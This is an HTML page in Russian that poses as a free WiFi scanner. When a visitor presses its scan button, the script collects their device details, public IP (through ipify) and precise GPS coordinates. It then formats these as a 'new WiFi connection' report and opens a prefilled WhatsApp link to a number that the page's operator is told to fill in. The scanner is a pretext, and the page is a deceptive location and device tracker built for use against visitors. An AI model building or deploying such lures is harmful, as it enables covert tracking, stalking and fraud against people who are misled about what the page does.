<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Finder</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: linear-gradient(135deg, #1a237e, #311b92); color: white; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        button { background: #25D366; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 16px; margin: 10px; }
        #whatsappLog { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; margin: 20px 0; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📶 WiFi Scanner (WhatsApp версия)</h1>
        <div id="status">Инициализация...</div>
        <div id="whatsappLog"></div>
        <button onclick="startScan()">Начать сканирование</button>
        
        <!-- Скрытая кнопка WhatsApp -->
        <a id="whatsappLink" style="display:none;"></a>
    </div>

    <script>
        // ТВОЙ НОМЕР WhatsApp (в международном формате без +)
        const WHATSAPP_NUMBER = "79991234567"; // ЗАМЕНИ НА СВОЙ!
        
        function log(msg) {
            document.getElementById('whatsappLog').innerHTML += msg + '<br>';
            console.log(msg);
        }
        
        async function startScan() {
            log('🚀 Начинаем сканирование...');
            
            // 1. Собираем данные устройства
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                time: new Date().toLocaleString('ru-RU'),
                url: window.location.href
            };
            
            log(`📱 Устройство: ${deviceInfo.userAgent}`);
            log(`🖥️ Экран: ${deviceInfo.screen}`);
            
            // 2. Получаем IP
            let ip = "Не определен";
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
                log(`📍 IP: ${ip}`);
            } catch (e) {
                log('❌ IP не получен');
            }
            
            // 3. Геолокация
            let locationText = "Не определено";
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    
                    locationText = `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`;
                    log(`📍 Координаты: ${locationText}`);
                } catch (e) {
                    log('📍 Геолокация не доступна');
                }
            }
            
            // 4. Формируем сообщение для WhatsApp
            const message = 
                `📱 *НОВОЕ ПОДКЛЮЧЕНИЕ WiFi*\n\n` +
                `*Время:* ${deviceInfo.time}\n` +
                `*Устройство:* ${deviceInfo.userAgent.substring(0, 50)}\n` +
                `*Экран:* ${deviceInfo.screen}\n` +
                `*Язык:* ${deviceInfo.language}\n` +
                `*IP:* ${ip}\n` +
                `*Координаты:* ${locationText}\n` +
                `*Ссылка:* ${deviceInfo.url}\n\n` +
                `✅ Данные собраны автоматически`;
            
            // 5. Отправляем в WhatsApp
            sendToWhatsApp(message);
            
            log('✅ Данные подготовлены для WhatsApp');
            log('📱 Нажми "Открыть WhatsApp" чтобы отправить');
        }
        
        function sendToWhatsApp(text) {
            // Кодируем сообщение для URL
            const encodedText = encodeURIComponent(text);
            
            // Формируем ссылку WhatsApp
            const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodedText}`;
            
            // Показываем кнопку
            const link = document.getElementById('whatsappLink');
            link.href = whatsappUrl;
            link.textContent = '📱 Отправить в WhatsApp';
            link.style.display = 'block';
            link.style.background = '#25D366';
            link.style.color = 'white';
            link.style.padding = '15px 30px';
            link.style.borderRadius = '25px';
            link.style.textDecoration = 'none';
            link.style.textAlign = 'center';
            link.style.margin = '20px 0';
            link.target = '_blank';
            
            // Автооткрытие через 3 секунды
            setTimeout(() => {
                if (confirm('Открыть WhatsApp для отправки данных?')) {
                    window.open(whatsappUrl, '_blank');
                }
            }, 3000);
        }
        
        // Автозапуск
        setTimeout(() => {
            document.getElementById('status').textContent = 'Готов к сканированию';
        }, 1000);
    </script>
</body>
</html>
